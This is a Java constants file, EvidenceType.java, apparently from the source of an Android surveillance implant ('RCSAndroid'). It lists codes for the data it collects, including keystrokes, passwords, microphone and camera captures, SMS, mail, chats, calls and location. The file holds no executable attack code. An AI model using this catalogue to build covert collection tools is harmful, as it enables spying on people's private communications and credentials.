/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : EvidenceType.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI;

/**
 * The Class EvidenceType.
 */
public class EvidenceType {

	/** The Constant UNKNOWN. */
	public static final int UNKNOWN = 0xFFFF; // in caso di errore
	
	/** The Constant NONE. */
	public static final int NONE = 0xFFFF; // in caso di errore
	
	/** The Constant FILEOPEN. */
	public static final int FILEOPEN = 0x0000;
	
	/** The Constant FILECAPTURE. */
	public static final int FILECAPTURE = 0x0001; // in realta' e'
	// 0x0000 e si
	// distingue tra LOG e
	// LOGF
	/** The Constant KEYLOG. */
	public static final int KEYLOG = 0x0040;
	
	/** The Constant PRINT. */
	public static final int PRINT = 0x0100;
	
	/** The Constant SNAPSHOT. */
	public static final int SNAPSHOT = 0xB9B9;
	
	/** The Constant UPLOAD. */
	public static final int UPLOAD = 0xD1D1;
	
	/** The Constant DOWNLOAD. */
	public static final int DOWNLOAD = 0xD0D0;
	
	/** The Constant CALL. */
	public static final int CALL = 0x0140;
	
	/** The Constant CALL_SKYPE. */
	public static final int CALL_SKYPE = 0x0141;
	
	/** The Constant CALL_GTALK. */
	public static final int CALL_GTALK = 0x0142;
	
	/** The Constant CALL_YMSG. */
	public static final int CALL_YMSG = 0x0143;
	
	/** The Constant CALL_MSN. */
	public static final int CALL_MSN = 0x0144;
	
	/** The Constant CALL_MOBILE. */
	public static final int CALL_MOBILE = 0x0145;
	
	/** The Constant URL. */
	public static final int URL = 0x0180;
	
	/** The Constant CLIPBOARD. */
	public static final int CLIPBOARD = 0xD9D9;
	
	/** The Constant PASSWORD. */
	public static final int PASSWORD = 0xFAFA;
	
	/** The Constant MIC. */
	public static final int MIC = 0xC2C2;
	
	/** The Constant CHAT. */
	public static final int CHAT = 0xC6C6;
	
	/** The Constant CAMSHOT. */
	public static final int CAMSHOT = 0xE9E9;
	
	/** The Constant ADDRESSBOOK. */
	public static final int ADDRESSBOOK = 0x0200;
	
	/** The Constant CALENDAR. */
	public static final int CALENDAR = 0x0201;
	
	/** The Constant TASK. */
	public static final int TASK = 0x0202;
	
	/** The Constant MAIL. */
	public static final int MAIL = 0x0210;
	
	/** The Constant SMS. */
	public static final int SMS = 0x0211;
	
	/** The Constant MMS. */
	public static final int MMS = 0x0212;
	
	/** The Constant LOCATION. */
	public static final int LOCATION = 0x0220;
	
	/** The Constant CALLLIST. */
	public static final int CALLLIST = 0x0230;
	
	/** The Constant DEVICE. */
	public static final int DEVICE = 0x0240;
	
	/** The Constant INFO. */
	public static final int INFO = 0x0241;
	
	/** The Constant APPLICATION. */
	public static final int APPLICATION = 0x1011;
	
	/** The Constant SKYPEIM. */
	public static final int SKYPEIM = 0x0300;
	
	/** The Constant MAIL_RAW. */
	public static final int MAIL_RAW = 0x1001;
	
	/** The Constant SMS_NEW. */
	public static final int SMS_NEW = 0x0213;
	
	/** The Constant LOCATION_NEW. */
	public static final int LOCATION_NEW = 0x1220;
	
	/** The Constant FILESYSTEM. */
	public static final int FILESYSTEM = 0xEDA1;

	/**
	 * Instantiates a new evidence type.
	 */
	private EvidenceType() {

	}
}
